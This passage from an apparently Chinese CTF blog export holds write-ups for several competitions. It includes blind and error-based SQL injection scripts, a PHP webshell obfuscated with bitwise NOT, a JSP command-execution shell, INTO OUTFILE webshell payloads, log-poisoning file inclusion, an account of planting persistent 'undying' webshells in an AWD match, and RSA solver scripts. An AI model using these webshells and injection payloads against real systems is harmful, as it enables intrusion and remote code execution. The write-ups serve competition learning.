socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((HOST, PORT)) s.sendall('GET / HTTP/1.1\\nHost: 127.0.0.1\\nConnection: Keep-Alive\\n\\n') # s.close() print 'ok' time.sleep(0.5)i = 8pool = ThreadPool( i )result = pool.map_async( run, range(i) ).get(0xffff) 修改HOST和端口，然后运行脚本，apache会不断kill掉旧进程fork新进程，访问%00lambda_1得到flag getshell绕过waf上传文件getshell，列出后台的waf123$black_char = array('a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',' ', '!', '\"', '#', '%', '&amp;', '*', ',', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', '&lt;', '&gt;', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '\\\\', '^', '`', '|', '+' , '&#123;' , '&#125;',\"'\"); 做法：~(X) 当X为一个汉字时对这个汉字取反第二位可以得到得到一个英文字符，我们利用这个性质构造webshell。eval是一种语言结构而不是函数，所以不能使用变量函数来调用它.这里可以使用asser代替。1234567891011121314151617181920212223&lt;?php$______=_;$_=~(瞰);$__=$_[$_==$_];$_=~(范);$__=$__.$_[$_==$_];$_=~(范);$__=$__.$_[$_==$_];$_=~(皮);$__=$__.$_[$_==$_];$_=~(半);$__=$__.$_[$_==$_];$_=~(拉);$__=$__.$_[$_==$_];$_=~(为);$___=$_[$_==$_];$_=~(了);$___=$___.$_[$_==$_];$_=~(高);$___=$___.$_[$_==$_];$___=$______.$___;$_=$$___;//$_=Array$__($_[_])//$__=assert 密码是_执行命令system(%27cat%20./../../../../Th1s_14_f14g%27)拿到flag MultiSql注册进去后在用户信息中找到注入点，进行盲注1http://104.131.107.84:8588/user/user.php?id=2-(mid(user(),1,1)&gt;binary(0x2a)) 过滤了select等东西，又提示flag不再数据库中，尝试读文件。12345678910111213import requestscode=''cookie=&#123; 'PHPSESSID':'6tq2gt2c31o1reeq4j962sodt6'&#125;for i in range(1,10000): for j in range(32,255): url='http://104.131.107.84:8588/user/user.php?id=2-(mid(load_file(0x2f7661722f7777772f68746d6c2f757365722f757365722e706870),%d,1)=binary(%s))'%(i,hex(j)) r=requests.get(url=url,cookies=cookie) if 'admin' in r.content: code+=hex(j)[2:] print code break 将文件以16进制打印出来，然后转换成文本。发现user.php是使用mysqli_multi_query进行查询的.mysqli_multi_query:执行多个针对数据库的查询所以这里应该就是写shell的地方。为了绕过select和单引号，我们使用MYSQL预处理语句:123set @sql = concat('create table ',newT,' like ',old);prepare s1 from @sql;execute s1; 将1select\"&lt;?php @eval($_POST['a']);?&gt;\" into outfile '/var/www/html/favicon/altman.php'; 进行编码贴上一个编码脚本12345b=''a='''select \"&lt;?php @eval($_POST['a']);?&gt;\" into outfile '/var/www/html/favicon/altman.php';'''for i in range(0,len(a)): b+='CHAR('+str(ord(a[i]))+'),'print b 然后写入执行命令拿到flag","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"},{"name":"wp","slug":"wp","permalink":"http://altman.vip/tags/wp/"}]},{"title":"CSTS-AWD-XI'AN","slug":"CSTS-AWD","date":"2018-05-28T13:29:17.000Z","updated":"2018-11-02T05:49:31.851Z","comments":true,"path":"2018/05/28/CSTS-AWD/","link":"","permalink":"http://altman.vip/2018/05/28/CSTS-AWD/","excerpt":"第二次打AWD模式的比赛，体验还不错，至少没有像上次一样被打成跑马场。","text":"第二次打AWD模式的比赛，体验还不错，至少没有像上次一样被打成跑马场。有了上次经验，这次拿到服务器后迅速改密码，dump源码，备份数据库，然后挂上了记录流量的脚本。源码放到D盾后扫到一些后门。我们直接注释掉，因为上次吃了亏，害怕又被打成跑马场，所以我们刚开始一直在防御。其实这里有些有过谨慎了，错过了最好的得分机会，排名靠前的队伍都是先进攻再慢慢防御的，虽然丢分多但是得分也多，我们前两个小时就丢了一次分，但是进攻太多，很多队伍都补上了洞，导致刚开始只拿到了14台机器的shell。上传了.index.php的不死马，这14台机器的shell都很稳定一直在得分。写出脚本定时的拿flag交flag后开始继续审计。下次还是要分工明确，队友补洞，我拿到shell后直接批量种马。【进攻拿分才是最重要的啊】 漏洞主办方留了差不多一大堆后门，放在D盾里扫出了一部分，然后定位一些危险函数找到一些，没什么好说的。主要说比赛结束前10分钟审出来了一个insert报错注入的洞。在service1的sql中，贴上关键代码1$sql = \"INSERT INTO staff VALUES('$idis','$username','$mail','$workname','$phoneis')\"; 这里面5个参数只有$workname没有做任何过滤，所以从这里入手。抓包后随便尝试下 workname=1’) 直接给了报错，尝试报错注入1workname=1','') and (updatexml(1,concat(0x7e,(select user()),0x7e),1));%23 成功返回user()这里可以直接读取文件，也能导出shell，时间原因我只尝试了读flag1workname=1','') and (updatexml(1,concat(0x7e,(select load_file('/home/flag')),0x7e),1));%23 成功读取，因为比赛马上结束，没有批量打，算是很可惜了。getshell的话可以直接用INTO OUTFILE导出木马在web目录里。可以先workname字段中存入一句话木马，然后利用payload导出php文件1workname=1','') and select workname from stall where idis=999 into out file '/var/www/html/sql/altman.php';%23 其他应该还有一个利用cache写文件的洞，全场没人利用，我也没有找到具体的利用方法，等之后想出来了再补充吧 再吐槽一下这比赛的check，居然是用nmap扫描服务，那我直接删目录岂不是无敌了？最后有好几个队伍，明明网站全部404，还没被扣分，这怎么玩，导致我控的服务器减少了一半。。。我佛了","categories":[],"tags":[{"name":"awd","slug":"awd","permalink":"http://altman.vip/tags/awd/"}]},{"title":"网络空间安全技术大赛","slug":"网络空间安全技术大赛","date":"2018-05-13T10:44:43.000Z","updated":"2018-11-02T05:49:43.732Z","comments":true,"path":"2018/05/13/网络空间安全技术大赛/","link":"","permalink":"http://altman.vip/2018/05/13/网络空间安全技术大赛/","excerpt":"WEB","text":"WEB web1任意注册登录后，发现改密码的功能，存在漏洞，抓包修改后改修改admin密码。登陆admin账户，发现img目录可读，在http://117.34.117.216/img/img726849685.jpg发现是flag web2.git泄露源码，利用githack恢复。index.php被加密，查看upload.php构造cookie上传shell1in_adminid=1，in_adminname=admin,in_adminpassword=1,in_permission=2,in_adminexpire=00e81e7d738c221945959d19c56cb33d 利用菜刀连接，找到fl4g.php1PM9SCREW †&gt;&lt;Þî6\u0017o=‘®vD&amp;©Ú?“LéXhpUò\u001cüM­\u0013\u0003ãÌósÂãL33CýRí¬¢½S2rœ&lt;’2ó\u001c\u0004x\u0012Ò7oä].º 也被加密 找到SCREW解密工具https://github.com/firebroo/screw_decode.git解密后得到flag{7cb3d823105433606ccac8fb75aed67c} web3跳转到QQ空间，抓包看一到一个url访问拿到一个JS文件，解混淆后审计，找到关键代码123456789$.ajax(&#123; url:'/f701fee85540b78d08cb276d14953d58', type:'POST', dataType:'json', data: \"data=\"+encodeURIComponent(encryptByDES($('#loginform').serialize(),key)), error:function(er)&#123; window.location.href='https://qzone.qq.com'; &#125;&#125;) 在ip，hrUW3PG7mp3RLd3dJu，LxMzAX2jog9Bpjs07jP可能存在注入。首先模拟JS上的加密，JS上使用的是一个标准的DES的ECB模式加密，在python中利用pyDes库重现加密过程然后进行时间盲注。脚本12345678910111213141516171819202122232425262728293031323334import pyDes import base64import requestsimport urlliburl='http://45.76.49.10:8001/f701fee85540b78d08cb276d14953d58'flag=''def des_ecb_encode(source, key): des_obj = pyDes.des(key.encode('utf-8'), pyDes.ECB, IV=None, pad=None, padmode=pyDes.PAD_PKCS5) des_result = des_obj.encrypt(source) return (des_result)key=\"MiaoMiao\"for i in range(1,100): for j in (33,127): #message=\"ip=1.1.1.1&amp;hrUW3PG7mp3RLd3dJu=1',if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='admin'),%d,1))=%d),sleep(5),1))#&amp;LxMzAX2jog9Bpjs07jP=\"%(i,j) #message=\"ip=1.1.1.1&amp;hrUW3PG7mp3RLd3dJu=1',if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d),sleep(5),1))#&amp;LxMzAX2jog9Bpjs07jP=\"%(i,j) message=\"ip=1.1.1.1&amp;hrUW3PG7mp3RLd3dJu=1',if((ascii(substr((select group_concat(password) from admin),%d,1))=%d),sleep(5),1))#&amp;LxMzAX2jog9Bpjs07jP=\"%(i,j) code = des_ecb_encode(message, key) pay= (base64.b64encode(code)) data=&#123; 'data':(pay) &#125; try: r=requests.post(url=url,data=data,timeout=4) except: flag+= chr(j) print flag break#admin,users#username,password#flag&#123;73ad1744f38b68ece51076c7ac77621b&#125; miscmisc3发现ICMP中的流量相似，仔细观察后发现每个请求都有两个字母不同，按时间线排序拼接后拿到flag{RyHgbCf5OhFEiyJnlt9c8ASP} RSA2e=3，典型低指数攻击。直接附上脚本1234567891011121314151617import gmpyc=80256065280425989347153660555632253204654757632704797390559450985825600409910703812294413750536361555897348650491697548574007864446117693097103136799284683292648287334023253488891301144881769557674366138889636475162525325855368132832237345279798028008137655682278413635753791609965810603989005785747744993045461207072415730041608172272077090225741385971n=27262030738190162906068533309218248319312037416856794814532459866130196673561833084739048171769479893806671499522643803412108279907223895517897969906253626028270289028646596897429641138913001561947557784840311014399973312098056896539904624036584153785225626096007313018814076860235378686567457599895712604364100507424939342862464483596795761725357279364545154915110900098124905389351969357103586063992040096368146580315262263546850581515833590884397726108478477798668261762306189036525841356592859315437201733146083995028221597538824801113980100295046731791678895520928441645173205511865657977068061078456941189550383e=3i=0while 1: if gmpy.root((c+i*n),e)[1]==1: print \"success\" m=gmpy.root((c+i*n),e)[0] print m print i break i=i+1print m 然后16进制转文本得到 my password is: I_Lov5_RSA_Rel6te7_me8sagE_aTTacK","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"http://altman.vip/tags/wp/"}]},{"title":"redhat2018-writeup","slug":"redhat2018-writeup","date":"2018-05-01T03:14:59.000Z","updated":"2018-11-02T05:48:22.075Z","comments":true,"path":"2018/05/01/redhat2018-writeup/","link":"","permalink":"http://altman.vip/2018/05/01/redhat2018-writeup/","excerpt":"这个比赛题目质量不错，也不是很难，体验极佳。","text":"这个比赛题目质量不错，也不是很难，体验极佳。 WEBsimple uploadweb签到题，题目说是上传，结果给个login页面尝试半天后找到了 upload.html ,直接上传php一句话，发现执行不了指令？突然看到后台是用JAVA写的。。。上传网上搜来的JSP马123456789101112&lt;% if(\"023\".equals(request.getParameter(\"pwd\")))&#123; java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"i\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\"&lt;pre&gt;\"); while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; out.print(\"&lt;/pre&gt;\"); &#125;%&gt; 成功执行指令拿到flag flag{2ad4ff03-cd30-4085-a5b2-ba18ebff6b05} shopping log比较麻烦的一道题，提示 Site is tmvb.com先修改host文件试试，不行。在这里踩坑好久，最后发现是要改成 www.tmvb.com进去后是比较常规的操作了，改referer头，改AL语言为JA。12\"referer\":\"www.DWW.COM\",\"Accept-Language\":\"ja\" 登陆进网站是一个订单查询。再结合两个hint。 hint: 不需要注入hint2：订单号从0000开始试可能不是一个明智的选择 很明显是订单号爆破，但是由于有一个md5验证，使得脚本极慢。。而我又不会写多线程，只能慢慢等了。附上python脚本123456789101112131415161718192021222324252627282930313233343536# encoding=utf-8import requestsimport hashlibdef md5(str1): return hashlib.md5(str1).hexdigest()def md51(str1): i = 0 while True: if md5(str(i))[0:6] == str1: return i else: i+=1url='http://www.tmvb.com/5a560e50e61b552d34480017c7877467info.php'header = &#123;\"referer\":\"www.DWW.COM\",\"Accept-Language\":\"ja\"&#125;cookie=&#123; 'PHPSESSID':'8tnae9j43ik44aia70sv2k5aq0'&#125;for i in range (312,9000): r=requests.get(url=url,headers=header,cookies=cookie) md=r.content[2687:2693] code=md51(md) print code url2='http://www.tmvb.com/api.php?action=report' data=&#123; 'TxtTid':10000-i, 'code':code &#125; k=requests.post(url=url2,data=data,headers=header,cookies=cookie) print 10000-i print k.content if 'error' not in k.content: break#9588 跑了快两个小时得到9588号订单 {“error”:0,”msg”:”Congradulations, your flag is flag{hong_mao_ctf_hajimaruyo}\\n”} biubiubiu尝试了一番注入无果后注意到page尝试目录穿越。成功访问到 etc/passwd1?page=../../../../../../../../../../etc/passwd 然后继续找文件读，读到access.log发现可以用修改UA头来控制文件内容写shell。成功拿到shell后翻遍目录也没找到 flag。注意到 conn.php，里面给了数据库账号密码。尝试连接，在admin表中password字段中发现flag flag{dbc98dd7-90fb-44f4-8dbe-35a72f07ec9d} miscNot Only Wireshark流量包打开发现可疑字段，提取数据后写成一个zip压缩包打开需要密码又发现 key=?id=1128%23 尝试1128不对，试出来密码就是 ?id=1128%23 【坑】打开看到flag 手工爆破先手工爆破拿到密码是某个文件名0328fc8b43cb2ddf89ba69fa5e6dbc05是压缩包密码打开后是加密的doc，继续暴力破解得到密码是5396《情系海边之城》又名《海边的曼彻斯特》是曼彻斯特编码F5F507是ID写脚本得到最后的flag12345678910111213141516171819a=0x123654AAA678876303555111AAA77611A321out=''flag=''b='0'+bin(a)[2:]for i in range(len(b) / 2): a1 = b[i*2:i*2+2] if a1=='01': out+='0' else: out+='1'print (out)for i in range(0,len(out),8): tmp=out[i:i+8][::-1] flag+=hex(int(tmp[:4],2))[2:] flag+=hex(int(tmp[4:],2))[2:]print flag.upper()5EFCF5F507AA5FAD77 cryptorsa system下载文件下来123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107import signaln = 0xBACA954B2835186EEE1DAC2EF38D7E11582127FB9E6107CCAFE854AE311C07ACDE3AAC8F0226E1435D53F03DC9CE6701CF9407C77CA9EE8B5C0DEE300B11DD4D6DC33AC50CA9628A7FB3928943F90738BF6F5EC39F786D1E6AD565EB6E0F1F92ED3227658FDC7C3AE0D4017941E1D5B27DB0F12AE1B54664FD820736235DA626F0D6F97859E5969902088538CF70A0E8B833CE1896AE91FB62852422B8C29941903A6CF4A70DF2ACA1D5161E01CECFE3AD80041B2EE0ACEAA69C793D6DCCC408519A8C718148CF897ACB24FADD8485588B50F39BCC0BBF2BF7AD56A51CB3963F1EB83D2159E715C773A1CB5ACC05B95D2253EEFC3CCC1083A5EF279AF06BB92Fe = 0x10001def pad(s): s += (256 - len(s)) * chr(256 - len(s)) ret = ['\\x00' for _ in range(256)] for index, pos in enumerate(s_box): ret[pos] = s[index] return ''.join(ret)def unpad(s): ret = ['\\x00' for _ in range(256)] for index, pos in enumerate(invs_box): ret[pos] = s[index] return ''.join(ret[0:-ord(ret[-1])])def str2int(s): return int(s.encode('hex'), 16)s_box = [ 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16]invs_box = [ 0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB, 0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB, 0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E, 0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25, 0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92, 0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84, 0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06, 0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B, 0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73, 0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E, 0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4, 0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F, 0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF, 0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D]def mul(x, y, z): ret = 1 while y != 0: if y &amp; 1 != 0: ret = (ret * x) % z x = (x * x) % z y &gt;&gt;= 1 return retdef welcom(): signal.alarm(5) print r\"\"\" ____ ____ _ ______ ______ _____ _____ __ __ | _ \\/ ___| / \\ / ___\\ \\ / / ___|_ _| ____| \\/ || |_) \\___ \\ / _ \\ \\___ \\\\ V /\\___ \\ | | | _| | |\\/| || _ &lt; ___) / ___ \\ ___) || | ___) || | | |___| | | ||_| \\_\\____/_/ \\_\\ |____/ |_| |____/ |_| |_____|_| |_|\"\"\"def main(): welcom() flag = open('./flag', 'r').read() flag_len = len(flag) assert(flag_len == 38) flag = pad(flag) while True: print '''1. sign flag2. get signed flagPlease give me your choice :''' cmd = raw_input() if cmd == '1': assert(len(flag) == 256) flag = unpad(flag)[:flag_len] + raw_input('Please sign your flag (0 - %d): ' % (256 - flag_len)) assert(len(flag) &lt;= 256) flag = pad(flag) print 'Success' elif cmd == '2': signature = mul(str2int(flag), e, n) print 'Your signed flag ciphertext is : 0x%x' % signature else: print 'Bye bye' exit(0)if __name__ == '__main__': main() 直接附上爆破脚本 ,这里要用的pwntools12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394# coding=utf-8from pwn import *import signaln = 0xBACA954B2835186EEE1DAC2EF38D7E11582127FB9E6107CCAFE854AE311C07ACDE3AAC8F0226E1435D53F03DC9CE6701CF9407C77CA9EE8B5C0DEE300B11DD4D6DC33AC50CA9628A7FB3928943F90738BF6F5EC39F786D1E6AD565EB6E0F1F92ED3227658FDC7C3AE0D4017941E1D5B27DB0F12AE1B54664FD820736235DA626F0D6F97859E5969902088538CF70A0E8B833CE1896AE91FB62852422B8C29941903A6CF4A70DF2ACA1D5161E01CECFE3AD80041B2EE0ACEAA69C793D6DCCC408519A8C718148CF897ACB24FADD8485588B50F39BCC0BBF2BF7AD56A51CB3963F1EB83D2159E715C773A1CB5ACC05B95D2253EEFC3CCC1083A5EF279AF06BB92Fe = 0x10001flag = \"\"a= 255def pad(s): s += (256 - len(s)) * chr(256 - len(s)) ret = ['\\x00' for _ in range(256)] for index, pos in enumerate(s_box): ret[pos] = s[index] return ''.join(ret)def unpad(s): ret = ['\\x00' for _ in range(256)] for index, pos in enumerate(invs_box): ret[pos] = s[index] return ''.join(ret[0:-ord(ret[-1])])def str2int(s): return int(s.encode('hex'), 16)s_box = [ 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16]invs_box = [ 0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB, 0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB, 0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E, 0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25, 0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92, 0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84, 0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06, 0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B, 0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73, 0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E, 0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4, 0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F, 0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF, 0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D]def mul(x, y, z): ret = 1 while y != 0: if y &amp; 1 != 0: ret = (ret * x) % z x = (x * x) % z y &gt;&gt;= 1 return retwhile (1): x=chr(a)*218 x2='\\x01'*a r=remote(\"123.59.138.211\", 23333) r.sendline(\"1\") r.sendline(x) r.sendline(\"1\") r.sendline(x2) r.sendline(\"2\") r.recvuntil(\"0x\") x3=r.recvline().replace(\"\\n\",\"\") x4=int(x3,16) for i in range(33,127): if x4 == mul(str2int(pad(flag+chr(i)+x2)), e, n): flag += chr(i) break a -= 1 print flag r.close()","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"},{"name":"wp","slug":"wp","permalink":"http://altman.vip/tags/wp/"}]},{"title":"时间盲注学习","slug":"时间盲注学习","date":"2018-04-07T14:36:37.000Z","updated":"2018-11-02T05:50:10.305Z","comments":true,"path":"2018/04/07/时间盲注学习/","link":"","permalink":"http://altman.vip/2018/04/07/时间盲注学习/","excerpt":"0x00 